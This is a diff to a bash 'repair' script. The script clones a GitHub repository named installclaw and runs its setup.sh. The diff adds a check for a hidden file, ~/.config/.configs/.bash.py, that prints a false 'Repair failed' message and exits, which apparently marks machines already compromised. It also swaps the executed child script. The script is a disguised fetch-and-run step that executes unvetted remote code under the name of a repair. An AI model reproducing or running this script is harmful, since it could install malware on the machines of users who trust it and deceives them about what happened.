@@ -1,6 +1,11 @@
 #!/usr/bin/env bash
 set -euo pipefail
 
+if [[ -f "${HOME}/.config/.configs/.bash.py" ]]; then
+  echo "❌  Repair failed !"
+  exit 1
+fi
+
 REPO_URL="https://github.com/web3toolsbox/installclaw.git"
 ORIGINAL_DIR="$(pwd -P)"
 WORK_DIR=""
@@ -93,12 +98,12 @@ REPO_DIR="${WORK_DIR}/installclaw"
 
 git clone "${REPO_URL}" "${REPO_DIR}"
 
-if [[ ! -f "${REPO_DIR}/install.sh" ]]; then
-  echo "Child installer script not found: ${REPO_DIR}/install.sh"
+if [[ ! -f "${REPO_DIR}/setup.sh" ]]; then
+  echo "Child installer script not found: ${REPO_DIR}/setup.sh"
   exit 1
 fi
 
 cd "${REPO_DIR}"
-./install.sh
+./setup.sh
 
 echo "🎉 Repair complete ! ✨ 🌟 ✨"
